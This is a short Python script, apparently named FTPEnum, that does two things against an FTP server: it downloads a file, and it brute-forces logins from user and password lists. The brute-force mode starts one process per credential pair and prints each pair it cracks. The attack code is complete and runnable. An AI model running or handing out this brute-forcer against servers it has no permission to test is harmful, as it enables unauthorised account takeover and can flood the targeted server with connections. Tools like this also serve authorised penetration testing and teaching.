import ftplib
import argparse
import multiprocessing

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Test Data
# FTP_SERVER_URL = 'ftp.be.debian.org'
# DOWNLOAD_DIR_PATH = '/pub/linux/kernel/v5.x/'
# DOWNLOAD_FILE_NAME = 'ChangeLog-5.0'

parse = argparse.ArgumentParser(description='FTPEnum Arguments')
parse.add_argument('-t',action='store',dest='url',help='FTP server Address',required=True)
parse.add_argument('--u',dest='username',default='anonymous', help='Username of the FTP server')
parse.add_argument('--p',dest='password',default='anonymous', help='Username of the FTP server')

# for download
parse.add_argument('-d',action='store',dest='dir',help='Directory of the file to be download')
parse.add_argument('-f',action='store',dest='file',help='Name of the file to be download')

# for Brute foce
parse.add_argument('-user-file',action='store',dest='brute_users',help='List of Users')
parse.add_argument('-password-file',action='store',dest='brute_passwords',help='List of Passwords')


# Get all the arguments
args = vars(parse.parse_args())

# print(args)

def ftp_file_download(server, username, password):
    # connect to the FTP server
    ftp_client = ftplib.FTP(server, username, password)
    # change the directory
    ftp_client.cwd(args['dir'])
    try:
        with open(args['file'], 'wb') as file_handler:
            ftp_cmd = 'RETR %s' %args['file']
            # get as binary
            ftp_client.retrbinary(ftp_cmd,file_handler.write)
            # close the socket
            ftp_client.quit()
    except Exception as exception:
        print('File could not be downloaded:',exception)

def ftp_brute_force(server, username, password):
    ftp = ftplib.FTP(server)
    try:
        print(f"Testing -> {username}:{password}")
        response = ftp.login(username,password)
        if "230" in response and ("granted" in response or "success" in response):
            print(bcolors.OKGREEN+f"Cracked {username}:{password}"+bcolors.ENDC)
    except Exception as E:
        print(bcolors.WARNING+'Error : '+str(E)+bcolors.ENDC)


if __name__ == '__main__':
    if args['dir'] and args['file']:
        ftp_file_download(server=args['url'],username=args['username'], password=args['password'])
    elif args['brute_users'] and args['brute_passwords']:
        try:
            with open(args['brute_users']) as users:
                users = users.readlines()
            with open(args['brute_passwords']) as passwords:
                passwords = passwords.readlines()
            for user in users:
                for password in passwords:
                    process = multiprocessing.Process(target=ftp_brute_force,args=(args['url'],user.rstrip(),password.rstrip()))
                    process.start()
        except Exception as E:
            print("Error : "+str(E))
    else:
        print("No option selected")